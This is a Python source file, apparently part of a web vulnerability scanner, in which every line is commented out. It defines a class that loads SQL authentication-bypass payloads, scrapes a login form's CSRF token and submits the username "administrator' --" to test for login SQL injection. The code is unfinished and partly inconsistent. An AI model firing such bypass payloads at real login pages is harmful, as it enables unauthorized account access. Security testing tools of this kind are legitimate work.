# import requests
# import os
# import Payloads.sql_login_payloads as sp
# from scrapping.Login import Login_form

# current_dir = os.path.dirname(os.path.abspath(__file__))

# class Lsqli:
#     def __init__(self,login_url,s):
#         self.login_url = login_url
#         self.payload_path = os.path.join(current_dir,'..','Payloads','sql_auth_bypass_payload.txt')
#         self.error_msg_path = os.path.join(current_dir,'..','Payloads','error_for_login.txt')
#         self.got_input = []
#         self.payloads = []
#         self.login_error_message = []
#         self.s = s

#         self.add_payloads()
#         self.add_login_error_msg()

#     def add_payloads(self):
#         with open(self.payload_path,"r") as payloads:
#             for payload in payloads:
#                 payload = payload.strip()
#                 self.payloads.append(payload)

#     def add_login_error_msg(self):
#         with open(self.error_msg_path,"r") as error_msgs:
#             for error_msg in error_msgs:
#                 error_msg = error_msg.strip()
#                 self.login_error_message.append(error_msg)

#     def set_password(self):
#         for input_tags in self.details['inputs']:
#             if input_tags['name'] == "password" or input_tags['name'] == "pass":
#                 input_tags['value'] = "randomtext"

#     def get_csrf_token(self):
#         details = Login_form(self.login_url,self.s).login_form_details()
#         for detail in details['inputs']:
#             if detail['name'] == 'csrf':
#                 return detail['value']
            
    
#     def check_for_login_sqli(self):
#         if self.get_csrf_token():
#             print(self.get_csrf_token())
#             csrf_token = self.get_csrf_token()
#             data = {"csrf":csrf_token,
#                     "username":"administrator' --",
#                     "password":"randomtext"}
#             response = self.s.get(self.login_url,params=data)
#             print(response.text)
#             # with open(self.error_msg_path,'r') as payloads:
#             #     for payload in payloads:
#             #         data = {"csrf":csrf_token,
#             #                 "username":"'-'",
#             #                 "password":"randomtext"}
#             #         response = self.s.post(self.login_url,data=data)
#             #         print(response.status_code)
#             #         print(response.text)
#             #         if self.error_msg_path in response.text:
#             #             print(response.status_code)
#             #             print(payload)
            
#             #-------------------------------------------------------------------------
#             #From sql_url.py 
#         #     def login_sqli(self):
#         # for login_link in self.login_check:
#         #     for link in self.crawl_links:
#         #         if login_link in link:
#         #             login_details = Login_form(link)
#         #             print(login_details.login_form_details())










